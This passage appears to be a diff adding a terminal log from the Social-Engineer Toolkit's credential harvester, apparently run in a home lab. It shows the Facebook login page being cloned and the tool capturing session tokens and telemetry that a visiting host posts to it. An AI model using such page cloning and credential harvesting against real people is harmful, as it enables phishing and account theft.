@@ -1,0 +1,197 @@
+et:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.0.103]:
+[-] SET supports both HTTP and HTTPS
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone:https://www.facebook.com/?locale=pt_BR
+
+[*] Cloning the website: https://login.facebook.com/login.php                
+[*] This could take a little bit...                                          
+
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                  
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80                               
+[*] Information will be displayed to you as it arrives below:                
+192.168.0.104 - - [11/Jan/2024 19:50:11] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryVqRztEvG5kOV5XFR      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020613652                                                                
+------WebKitFormBoundaryVqRztEvG5kOV5XFR                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"user":"0","webSessionId":"w54duy:k7iidb:q4itai","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"5f230a8e-7cf2-494f-915a-31f827389062\",\"ct\":1659080345,\"sjd\":\"uksIwyjX9TpIqVXiuY7WPdSaFldgQr41wfIF2V9IZrH+5GcMw2yjGJYs7aTsMszJaQlHS5tgHYAJ4Wv+T8E32LrMVuHfdkeEOn9Rad3dNqCoa6JTZbuH0p16pHAw6zoSYH3jMiLZJ9KlgDxCOGmtpw==\",\"sid\":-1}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020580659.2,"b":[1,0]},1705020613651,0,513]],"trigger":"falco:bd_pdc_signals"}]               
+------WebKitFormBoundaryVqRztEvG5kOV5XFR--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:50:13] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=1&__rev=1010784913&__s=w54duy%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryEg5hgdieX9DQMvlT      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020614670                                                                
+------WebKitFormBoundaryEg5hgdieX9DQMvlT                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"5f230a8e-7cf2-494f-915a-31f827389062\",\"ct\":1659080345,\"sjd\":\"uksIwyjX9TpIqVXiuY7WPdSaFldgQr41wfIF2V9IZrH+5GcMw2yjGJYs7aTsMszJaQlHS5tgHYAJ4Wv+T8E32LrMVuHfdkeEOn9Rad3dNqCoa6JTZbuH0p16pHAw6zoSYH3jMiLZJ9KlgDxCOGmtpw==\",\"sid\":-1}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020580659.2,"b":[1,0]},1705020613651,1,513],["falco:web_blue_time_spent_navigation",{"e":"{\"json_data\":\"{\\\"source_path\\\":null,\\\"source_token\\\":null,\\\"dest_path\\\":\\\"XWebLoginController\\\",\\\"dest_token\\\":\\\"96e88af3\\\",\\\"impression_id\\\":\\\"1DOTJ8tFP7Waw2iuH\\\",\\\"cause\\\":\\\"load\\\",\\\"sid_raw\\\":\\\"w54duy:k7iidb:q4itai\\\",\\\"referrer\\\":\\\"\\\",\\\"dest_ef_page\\\":null,\\\"dest_uri\\\":\\\"https://www.facebook.com/login.php\\\"}\"}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020580768.9,"b":[1,0]},1705020613665.7,0,654],["falco:bd_pdc_signals",{"e":"{\"asid\":\"5f230a8e-7cf2-494f-915a-31f827389062\",\"ct\":1659080345,\"sjd\":\"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\",\"sid\":-1}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020580792,"b":[1,0]},1705020613688.8,0,2419],["falco:web_perf_device_info_log",{"e":"{\"cpu_cores\":4,\"ram\":null,\"gpu_renderer\":\"ANGLE (Intel, Intel(R) HD Graphics Family (0x00000A16) Direct3D11 vs_5_0 ps_5_0, D3D11)\",\"gpu_vendor\":\"Google Inc. (Intel)\"}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020580811.0999,"b":[1,0]},1705020613707.6,0,449]],"user":"0","webSessionId":"w54duy:k7iidb:q4itai","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":""}]                                         
+------WebKitFormBoundaryEg5hgdieX9DQMvlT--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:50:14] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=2&__rev=1010784913&__s=w54duy%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarykWs83si7JEP1S9ue      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020622679                                                                
+------WebKitFormBoundarykWs83si7JEP1S9ue                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"+BLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCI1ZjIzMGE4ZS03Y2YyLTQ5NGYtOTE1YS0zMWY4MjczODkwNjJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CcdWtzSXd5alg5VHBJcVZYaXVZN1dQZFNhRmxkZ1FyNDF3ZklGMlY5SVpySCs1R2NNdzJ5akdKWXM3YVRzTXN6SmFRbEhTNXRnSFlBSjRXditUOEUzMkxyTVZ1SGZka2VFT245UmFkM2ROcUNvYTZKVFpidUgwcDE2cEhBdzZ6b1NZSDNqTWlMWko5S2xnRHhDT0dtdHB3PT1cIixcIgno9DQBLTF9IiwiciI6MSwiZCI6IiRefEFjWmw3eXRQa2FoY2VFLTNFODVhdXRlaVA1M0hUazh6SXN3TXRsQ0NPTkcxSUtLY3Z5ek9HeVFhSEhES2tmWHFoSl9JZk1iZ00zS3FINlhpcnNtdHZ1cGVleHBNUVpZfGZkLkFjYWo5OWhOU3JXTW9aaHdINmlTSTlORVhZV3dEek9ybENGcFdmQTNXT3hhMmxrak00c2IxaDhMUEMtZ0ZMa01jU0N2N0xOS20xYkxaOXc2LUpHR1gtQ1MiLCJzIjoidzU0ZHV5Oms3aWlkYjpxNGl0YWkiLCJ0IjoxNzA1MDIwNTgwNjU5LjIsImIiOlsxLDBdfSwxNzA1MDIwNjEzNjUxLDIsNTEzXSxbImZhbGNvOm9kc193ZWJfYmF0Y2giWS44YmF0Y2hcIjp7XCIxMzQ0CQoFMxguZXZlbnQuNmgCCC5DMwkjBGpzDSBsd3JpdGVfdG9fcXVldWVcIjpbMixudWxsXX0sXA1JJGZhYnJpYy53d3eOPwAANAk/cCxcImpzLnVzZV9iYW56YWkubG9nX2NyaXRpY2FsAWcAMS4oAA0kDHBvc3RqKQAUcGxhbmVzES0Vuhx0cmFuc3BvcmEHcn8AKGltbWVkaWF0ZWx5goIAbiwANtYAAUstNAn1Os0AHSA5VE6dATWaNmAAkjYBDGluZ18FVB1uCY42TQABHy16Po0AeHdlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvblxFZEbTAW4oAT0JMqAA0oEAjnwCalkASHBlcmZfZGV2aWNlX2luZm9fbG8hDQB7SqcCPSQpQ8rIAE5vAK7CACGdDDI5NjYpdwhtcy45lQgucWFhjAkaHRdEYml0cy5qc19pbml0aWFsaXplwUg1FAR9ff5pBf5pBf5pBdZpBSA1NjYyLjMsImJGaQUwODU1OC44LDAsMTM0MLlsYQk5WChfYml0X2FycmF5Irl3FHNpZF9yYSGEBFwiTu0F5ZgQc3RhcnQFSgBctfkgNjEzLFwidG9zCVMAXKFwDDYzLDBBagEWGGN1bVwiOjQNJABpIcIMXCJxNMFBBFwiDRYEbGVhjgA5DQ4Yc2VxXCI6MP7dAf7dAf7dAdbdARQ4NzczLjdO3QE4MjE2NzAuMiwwLDQxOF1d","user":"0","webSessionId":"w54duy:k7iidb:q4itai","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                    
+------WebKitFormBoundarykWs83si7JEP1S9ue--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:50:22] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=3&__rev=1010784913&__s=w54duy%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryeUlOKMgN3PArSUOr      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020643563                                                                
+------WebKitFormBoundaryeUlOKMgN3PArSUOr                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"user":"0","webSessionId":"w54duy:k7iidb:q4itai","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"5f230a8e-7cf2-494f-915a-31f827389062\",\"ct\":1659080345,\"sjd\":\"uksIwyjX9TpIqVXiuY7WPWUVp+Wo+b/vvI0FH7o1bShJ9LqmxOxHICRDEeXvCo2jTxr6hHUWC0G5DWCtko5ycdQoHGXJKHouv2vgbGCjj3KMaRbvTMvJx5VPbukmjHJU3lUF0sgfuDxUiFNGXUYVVA==\",\"sid\":-1}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":"w54duy:k7iidb:q4itai","t":1705020610666.5,"b":[1,0]},1705020643563.2,0,513]],"trigger":"falco:bd_pdc_signals"}]             
+------WebKitFormBoundaryeUlOKMgN3PArSUOr--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:50:43] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=4&__rev=1010784913&__s=w54duy%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: local_storage[Session]=20                                             
+PARAM: local_storage[hb_timestamp]=13                                        
+PARAM: local_storage[signal_flush_timestamp]=13                              
+PARAM: session_storage[TabId]=6                                              
+PARAM: session_storage[sp_pi]=216                                            
+PARAM: logtime=0                                                             
+POSSIBLE USERNAME FIELD FOUND: __user=0                                      
+PARAM: __a=1                                                                 
+PARAM: __req=5                                                               
+PARAM: __hs=19734.BP:DEFAULT.2.0..0.0                                        
+PARAM: dpr=1                                                                 
+PARAM: __ccg=EXCELLENT                                                       
+PARAM: __rev=1010784913                                                      
+PARAM: __s=w54duy:k7iidb:q4itai                                              
+PARAM: __hsi=7323007627383505681                                             
+PARAM: __dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE                  
+PARAM: __csr=                                                                
+PARAM: lsd=AVoM9VtJO_8                                                       
+PARAM: jazoest=2902                                                          
+PARAM: __aaid=0                                                              
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1010784913                           
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1705020579                           
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:03] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: local_storage[Session]=20                                             
+PARAM: local_storage[hb_timestamp]=13                                        
+PARAM: local_storage[signal_flush_timestamp]=13                              
+PARAM: session_storage[TabId]=6                                              
+PARAM: session_storage[sp_pi]=216                                            
+PARAM: logtime=0                                                             
+POSSIBLE USERNAME FIELD FOUND: __user=0                                      
+PARAM: __a=1                                                                 
+PARAM: __req=6                                                               
+PARAM: __hs=19734.BP:DEFAULT.2.0..0.0                                        
+PARAM: dpr=1                                                                 
+PARAM: __ccg=EXCELLENT                                                       
+PARAM: __rev=1010784913                                                      
+PARAM: __s=w54duy:k7iidb:q4itai                                              
+PARAM: __hsi=7323007627383505681                                             
+PARAM: __dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE                  
+PARAM: __csr=                                                                
+PARAM: lsd=AVoM9VtJO_8                                                       
+PARAM: jazoest=2902                                                          
+PARAM: __aaid=0                                                              
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1010784913                           
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1705020579                           
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:03] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: local_storage[Session]=20                                             
+PARAM: local_storage[hb_timestamp]=13                                        
+PARAM: local_storage[signal_flush_timestamp]=13                              
+PARAM: session_storage[TabId]=6                                              
+PARAM: session_storage[sp_pi]=216                                            
+PARAM: logtime=0                                                             
+POSSIBLE USERNAME FIELD FOUND: __user=0                                      
+PARAM: __a=1                                                                 
+PARAM: __req=7                                                               
+PARAM: __hs=19734.BP:DEFAULT.2.0..0.0                                        
+PARAM: dpr=1                                                                 
+PARAM: __ccg=EXCELLENT                                                       
+PARAM: __rev=1010784913                                                      
+PARAM: __s=w54duy:k7iidb:q4itai                                              
+PARAM: __hsi=7323007627383505681                                             
+PARAM: __dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE                  
+PARAM: __csr=                                                                
+PARAM: lsd=AVoM9VtJO_8                                                       
+PARAM: jazoest=2902                                                          
+PARAM: __aaid=0                                                              
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1010784913                           
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1705020579                           
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:03] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary6KGpQ5lEeHBBTBad      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020687020                                                                
+------WebKitFormBoundary6KGpQ5lEeHBBTBad                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"jhTwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCI1ZjIzMGE4ZS03Y2YyLTQ5NGYtOTE1YS0zMWY4MjczODkwNjJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CcdWtzSXd5alg5VHBJcVZYaXVZN1dQZFNhRmxkZ1FyNDF3ZklGMlY5SVpySCs1R2NNdzJ5akdKWXM3YVRzTXN6SmFRbEhTNXRnSFlBSjRXditUOEUzMkxyTVZ1SGZka2VFT245UmFkM2ROcUNvYTZKVFpidUgwcDE2cEhBdzZ6b1NZSDNqTWlMWko5S2xnRHhDT0dtdHB3PT1cIixcIgno9DQBLTF9IiwiciI6MSwiZCI6IiRefEFjWmw3eXRQa2FoY2VFLTNFODVhdXRlaVA1M0hUazh6SXN3TXRsQ0NPTkcxSUtLY3Z5ek9HeVFhSEhES2tmWHFoSl9JZk1iZ00zS3FINlhpcnNtdHZ1cGVleHBNUVpZfGZkLkFjYWo5OWhOU3JXTW9aaHdINmlTSTlORVhZV3dEek9ybENGcFdmQTNXT3hhMmxrak00c2IxaDhMUEMtZ0ZMa01jU0N2N0xOS20xYkxaOXc2LUpHR1gtQ1MiLCJzIjoidzU0ZHV5Oms3aWlkYjpxNGl0YWkiLCJ0IjoxNzA1MDIwNTgwNjU5LjIsImIiOlsxLDBdfSwxNzA1MDIwNjEzNjUxLDMsNTEzXSxbImZhbGNvOm9kc193ZWJfYmF0Y2giWS44YmF0Y2hcIjp7XCIxMzQ0CQoFM3wuZXZlbnQud2ViX3RpbWVfc3BlbnRfYml0X2FycmF5XAU0bGpzLnVzZV9iYW56YWkubG9nX2ltbWVkaWF0ZWwBIyRbMSxudWxsXSxcASsNJxxwb3N0aW5nXwVhAFwFwAUlDH0sXCIJezBmYWJyaWMud3d3LkMz+moAdpYAFHBsYW5lcxGaQHdyaXRlX3RvX3RyYW5zcG9yLp8ACcQFtRkpEHF1ZXVlUsQADSlaPwEu2AANKhF8QlMABH19/uMC/uMC/uMC0uMCJDkzNzc0LjQsImJFIwgwXX1V4zAyNjY3MC45LDAsNjk0WeX+FAXmFAXwgVdVVnArV28rYi92dkkwRkg3bzFiU2hKOUxxbXhPeEhJQ1JERWVYdkNvMmpUeHI2aEhVV0MwRzVEV0N0a281eWNkUW9IR1hKS0hvdXYydmdiR0NqajNLTWFSYnZUTXZKeDVWUGJ1a21qSEpVM2xVRjBzZ2Z1RHhVaUZOR1hVWVZWQT3+FAX+FAX+FAXuFAWpFBw2MTA2NjYuNU4xAiA0MzU2My4yLDH+FgWtFjZqAl6iBBxjcml0aWNhbJ0giUX+CQU2CQWOZwClBlYpAP4DBX4DBTYsAf75BP75BP75BP75BIb5BBw2MTU2NjguN1LIAjQ4NTY1LjEsMCw2NjVdXQ==","user":"0","webSessionId":"w54duy:k7iidb:q4itai","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"w54duy:k7iidb:q4itai\",\"start_time\":1705020622,\"tos_array\":[15692807,0],\"tos_cum\":18,\"tos_id\":\"q4itai\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|AcZl7ytPkahceE-3E85auteiP53HTk8zIswMtlCCONG1IKKcvyzOGyQaHHDKkfXqhJ_IfMbgM3KqH6XirsmtvupeexpMQZY|fd.Acaj99hNSrWMoZhwH6iSI9NEXYWwDzOrlCFpWfA3WOxa2lkjM4sb1h8LPC-gFLkMcSCv7LNKm1bLZ9w6-JGGX-CS","s":":k7iidb:q4itai","t":1705020653117.2,"b":[1,0]},1705020686013.7,0,419]],"user":"0","webSessionId":":k7iidb:q4itai","compression":""}]                                                                  
+------WebKitFormBoundary6KGpQ5lEeHBBTBad--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:26] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=8&__rev=1010784913&__s=%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryjyN7A5dZsDUQzHC7      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020697553                                                                
+------WebKitFormBoundaryjyN7A5dZsDUQzHC7                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
